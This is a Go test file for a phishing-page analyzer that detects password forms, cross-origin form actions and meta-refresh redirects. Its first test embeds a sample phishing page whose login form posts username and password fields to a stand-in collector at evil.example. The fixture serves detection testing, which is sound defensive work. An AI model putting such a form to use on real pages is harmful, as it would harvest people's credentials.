package tests

import (
	"testing"

	"clouseau/internal/analyzer/submodules"
)

func TestParseFormsDetectsPasswordAndCrossOrigin(t *testing.T) {
	body := []byte(`<html><head><meta http-equiv="refresh" content="0;url=https://evil.example"></head><body>
<form action="https://evil.example/collect" method="post">
<input type="text" name="user">
<input type="password" name="pass">
<input type="hidden" name="id" value="1">
</form>
<form action="/login" method="get"><input type="password"></form>
</body></html>`)

	result := submodules.ParseForms(body, "https://phish.example/page")
	if result == nil {
		t.Fatal("expected forms result, got nil")
	}
	if !result.MetaRefresh {
		t.Error("meta refresh = false, want true")
	}
	if len(result.Forms) != 2 {
		t.Fatalf("forms = %+v, want 2 entries", result.Forms)
	}
	if result.PasswordForms != 2 {
		t.Fatalf("password forms = %d, want 2", result.PasswordForms)
	}
	if result.CrossOriginForms != 1 {
		t.Fatalf("cross-origin forms = %d, want 1", result.CrossOriginForms)
	}

	first := result.Forms[0]
	if first.Action != "https://evil.example/collect" || first.Method != "POST" {
		t.Fatalf("first form = %+v, want POST https://evil.example/collect", first)
	}
	if !first.CrossOrigin {
		t.Fatalf("first form = %+v, want cross-origin", first)
	}
	if first.PasswordFields != 1 || first.HiddenFields != 1 {
		t.Fatalf("first form = %+v, want 1 password and 1 hidden field", first)
	}

	second := result.Forms[1]
	if second.CrossOrigin {
		t.Fatalf("second form = %+v, want same-origin", second)
	}
	if second.Method != "GET" {
		t.Fatalf("second form = %+v, want GET", second)
	}
}

func TestParseFormsNone(t *testing.T) {
	body := []byte(`<html><body><p>plain page</p></body></html>`)

	if result := submodules.ParseForms(body, "https://example.com"); result != nil {
		t.Fatalf("expected nil forms, got %+v", result)
	}
}

func TestFormMerge(t *testing.T) {
	first := &submodules.FormResult{
		Forms:         []submodules.FormInfo{{Action: "/login", Method: "POST", PasswordFields: 1}},
		PasswordForms: 1,
	}
	second := &submodules.FormResult{
		MetaRefresh: true,
		Forms: []submodules.FormInfo{
			{Action: "/login", Method: "POST", PasswordFields: 1},
			{Action: "https://evil.example/p", Method: "POST", CrossOrigin: true},
		},
		PasswordForms:    1,
		CrossOriginForms: 1,
	}

	first.Merge(second)
	first.Merge(nil)

	if !first.MetaRefresh {
		t.Error("meta refresh = false, want true after merge")
	}
	if len(first.Forms) != 2 {
		t.Fatalf("forms = %+v, want 2 deduplicated entries", first.Forms)
	}
	if first.PasswordForms != 1 || first.CrossOriginForms != 1 {
		t.Fatalf("counts = password %d cross-origin %d, want 1 and 1", first.PasswordForms, first.CrossOriginForms)
	}
}
